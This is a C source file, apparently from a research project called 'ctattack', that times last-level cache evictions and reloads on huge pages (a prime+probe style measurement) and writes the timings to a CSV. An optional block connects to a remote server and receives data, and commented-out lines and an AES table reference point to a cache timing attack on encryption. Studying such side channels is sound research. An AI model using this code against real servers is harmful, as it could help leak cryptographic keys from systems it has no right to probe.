
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include "ctattack.h"

//#define CONNECT

#define AVERAGE_REPS 100
#define MAP_HUGE_2MB (21 << MAP_HUGE_SHIFT)

#define REPS 5

#define CACHE_LINE_DISTANCES 1

int main(int argc, char* argv[])
{


    unsigned long int tt = 0;
    unsigned int begin, end;
    unsigned long int x = 0;
    FILE *fp;


//    int fd1 = fopen("/mnt/hgfs", "rw");
//    int fd2 = fopen("/mnt/hgfs", "rw");

    size_t mem_length = (size_t)CACHE_L3_SIZE; //MB(8); //CACHE_L3_SIZE;  //3*1024*1024; // 4MB : 10000 00000000 00000000

//    volatile char *B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGE_2MB, -1, 0);
    volatile char *B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B2 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B3 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B4 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B5 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B6 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B7 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *B8 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
//    volatile char *B_off = B + (0x403a40 & 0xFFF);
    
//    volatile char *C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGE_2MB, -1, 0);
    volatile char *C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C2 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C3 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C4 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C5 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C6 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C7 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    // volatile char *C8 = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);


    //volatile char *D = mmap(NULL, 2*mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // x += B2[i];      // Takes less time for reload without CONNECT
    // x += B3[i];      // Takes less time for reload without CONNECT
    // x += B4[i];      // Takes less time for reload without CONNECT
    // x += B5[i];      // Takes less time for reload without CONNECT
    // x += B6[i];      // Takes less time for reload without CONNECT
    // x += B7[i];      // Takes less time for reload without CONNECT
    // x += B8[i];      // Takes less time for reload without CONNECT

    fp = fopen("/home/user/Documents/github/ctattack/data.csv", "w");

/*    
    volatile char *B, *C;
    B=malloc((int)mem_length);
    C=malloc((int)mem_length);
*/
    printf("B\t%p\t\n", B);
    printPtr2bin((void*)B);
    
    printf("B\t%p\t\n", C);
    printPtr2bin((void*)C);

    //printf("Te4\t%x\t\n", 0x403a40);
    //printPtr2bin((void*)0x403a40);

    //printf("Te4 & 0xFFF\t%x\t\n", 0x403a40 & 0xFFF);
    //printPtr2bin((void*)(0x403a40 & 0xFFF));

    //printf("B_off\t%p\t\n", B_off);
    //printPtr2bin((void*)B_off);
/*
    for (int i = 0; i < (int)mem_length; ++i) {
        B[i] = (char)rand()%256;
    }
    for (int i = 0; i < (int)mem_length; ++i) {
        C[i] = (char)rand()%256;
    }
*/

for (int count = 0; count < AVERAGE_REPS; ++count) {

#ifdef CONNECT
    if (argc != 3) {
        //printf("[!]Usage: %s IP PORT\n", argv[0]);
        return 1;
    }
    char *ip_str = argv[1];
    int server_port = atoi(argv[2]);


    int socket_desc;
    struct sockaddr_in server;
    char *message, server_reply[2000];



    socket_desc = socket(AF_INET, SOCK_STREAM, 0);

    if (socket_desc == -1) {
        //printf("Could not create socket\n");
        //return 1;
    }

    //printf("socket_desc: %d\n", socket_desc);


    server.sin_addr.s_addr = inet_addr(ip_str);     //80.239.174.120
    server.sin_family = AF_INET;
    server.sin_port = htons( server_port );
#endif

//for (int count = 0; count < 1000; ++count) {
    /*
     *
     * Bring huge from disk
     *
     */
    unsigned int begin2, end2;
    begin2 = timestamp_start();
    x += C[0];
    x += C[MB(2)];
    x += C[MB(4)];
    //x += C[MB(6)];
    //x += D[0];
    //x += D[MB(2)];
    //x += D[MB(4)];
    //x += D[MB(6)];
    x += B[0];
    x += B[MB(2)];
    x += B[MB(4)];
    x += B[MB(6)];
    end2 = timestamp_stop();
    //printf("Load\t:\t%.8d cycles\n", end-begin);
    begin = timestamp_start();
    x += B[MB(2)-1];
    end = timestamp_stop();
//    printf("Disk\t:\t%.8d cycles\t%.8d cycles\n", end2-begin2, end-begin);


    for (int i = 0; i < (int)mem_length; i+=CACHE_L3_SET_OFFSET) {
        C[i+CACHE_LINE_DISTANCES*CACHE_LINE] = 1;
    }
    for (int i = 0; i < (int)mem_length; i+=CACHE_L3_SET_OFFSET) {
        B[i+CACHE_LINE_DISTANCES*CACHE_LINE] = 1;
    }

    /*
     *
     * Need to setup this part for Fix-Policy if possible
     * Attempt to get LRU policy
     *
     */

    for (int j = 0; j < 10000; ++j) {
        for (int k = 0; k < (int)mem_length; k+=CACHE_L3_SET_OFFSET) {
            x += C[k+CACHE_LINE_DISTANCES*CACHE_LINE];
        }

        for (int i = 0; i < CACHE_L3_ASSOCIATIVITY; ++i) {
            x += C[CACHE_L3_SET_OFFSET*(CACHE_L3_ASSOCIATIVITY+i)];
            for (int k = 1; k < (int)mem_length; k+=CACHE_L3_SET_OFFSET) {
                x += C[k+CACHE_LINE_DISTANCES*CACHE_LINE];
            }
        }
    }

    begin = timestamp_start();
    for (int i = 0; i < (int)mem_length; i+=CACHE_L3_SET_OFFSET) {
        x += B[i+CACHE_LINE_DISTANCES*CACHE_LINE];      // Takes less time for reload without CONNECT
        //B[i] = 1;     // Takes more time for reload without CONNECT
        //printf("%d\n", i);
    }
    // for (int j = 0; j < CACHE_L1_SIZE; j+=CACHE_L1_SET_OFFSET) {
    //     x += B[j];
    // }
    end = timestamp_stop();
//    printf("Load\t:\t%.8d cycles\n", end-begin);

    for (int j = 0; j < REPS; ++j) {
        begin = timestamp_start();
        for (int i = 0; i < (int)mem_length; i+=CACHE_L3_SET_OFFSET) {
            x += B[i+CACHE_LINE_DISTANCES*CACHE_LINE];      // Takes less time for reload without CONNECT
            //B[i] = 1;     // Takes more time for reload without CONNECT
        }
        // for (int j = 0; j < CACHE_L1_SIZE; j+=CACHE_L1_SET_OFFSET) {
        //     x += B[j];
        // }
        //x += B[0];
        end = timestamp_stop();
//        printf("Load2\t:\t%.8d cycles\n", end-begin);
    }




#ifdef CONNECT
    //Connect to remote server
    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //printf("connection error\n");
        return 1;
    }
#endif
   
    ////printf("Connected\n");


#ifdef CONNECT
/*
    if( send(socket_desc , "message" , strlen("message") , 0) < 0)
    {
        puts("Send failed");
        return 1;
    }
    puts("Data Send\n");
*/

    if( recv(socket_desc, server_reply , 2000 , 0) < 0)
    {
        puts("recv failed");
    }

#endif


    begin = timestamp_start();
    for (int i = 0; i < (int)mem_length; i+=CACHE_L3_SET_OFFSET) {
        x += B[i+CACHE_LINE_DISTANCES*CACHE_LINE];      // Takes less time for reload without CONNECT
        //B[i] = 1;     // Takes more time for reload without CONNECT
    }
    // for (int j = 0; j < CACHE_L1_SIZE; j+=CACHE_L1_SET_OFFSET) {
    //     x += B[j];
    // }
    //x += B[0];
    end = timestamp_stop();
//    printf("Reload\t:\t%.8d cycles\t%d accesses\n", end-begin, (int)mem_length/CACHE_L3_SET_OFFSET);


    //begin = timestamp_start();
    ////for (int i = 0; B+i < B+(int)mem_length; i+=CACHE_LINE) { //CACHE_L1_SET_OFFSET
    ////    x += B[i];
    //    //B_off[i] = 1;
    ////}
    //x += B[0];
    //end = timestamp_stop();
    //printf("%d\n", end-begin);
    tt += (end - begin);///(mem_length/CACHE_LINE);

    fprintf(fp, "%d\n", (end-begin));

    //printf("Reload\t:\t%.8lu cycles\n", tt/(count+1));


#ifdef CONNECT
/*
    char msg[64];
    unsigned char enc_str[240];
    s//printf(msg, "Encrypted Ciphertext: ");

    enc_str[0] = '\0';

    for(int i=0;i<16;i++) {
        s//printf((char*)enc_str, "%s%02X:", enc_str, (unsigned char)server_reply[i]);
    }

    enc_str[strlen((char*)enc_str) - 1] = '\0';
    
    s//printf(msg, "%s%s", msg, enc_str);

    //printf("%s\n", (unsigned char *) msg);

    puts("Reply received\n");
    puts(server_reply);
*/

    close(socket_desc);
#endif
    //for (int i = 0; i < 8000000; ++i);
}
printf("Reload\t:\t%.8lu cycles\n", tt/AVERAGE_REPS);

fclose(fp);

}


